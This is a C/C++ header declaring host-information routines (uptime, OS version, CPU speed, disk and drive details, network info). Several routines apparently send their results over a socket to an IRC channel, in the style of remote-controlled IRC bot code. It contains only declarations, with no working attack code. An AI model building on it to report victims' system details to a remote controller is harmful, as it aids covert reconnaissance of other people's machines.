enum {OS_UNKNOWN, OS_WIN95, OS_WIN98, OS_WINME, OS_WINNT, OS_WIN2K, OS_WINXP, OS_WIN2K3};

char *Uptime(int startup=0);
int OSVersionCheck(void);

#ifndef NO_SYSINFO
inline unsigned __int64 GetCycleCount(void);
unsigned __int64 GetCPUSpeed(void);
char *sysinfo(char *sinfo, SOCKET sock);
#endif

#ifndef NO_NETINFO
char *netinfo(char *ninfo, char *host, SOCKET sock);
#endif

typedef struct DKSP
{
	__int64 AvailableBytes;
	__int64 FreeBytes;
	__int64 TotalBytes;

} DKSP;

typedef struct DKSPKB
{
	char AvailableKB[128];
	char FreeKB[128];
	char TotalKB[128];
	
} DKSPKB;

BOOL FileExists(char *filename, int mode=04);
const char *commaI64(unsigned __int64 number);
const char *DriveType(LPCSTR Drive);
DKSP DiskSpace(LPCSTR Drive);
DKSPKB DiskSpaceKB(LPCSTR Drive);
void DriveSpace(SOCKET sock, char *chan, BOOL notice, LPCSTR Drive);
void DriveInfo(SOCKET sock, char *chan, BOOL notice, LPCSTR Drive);

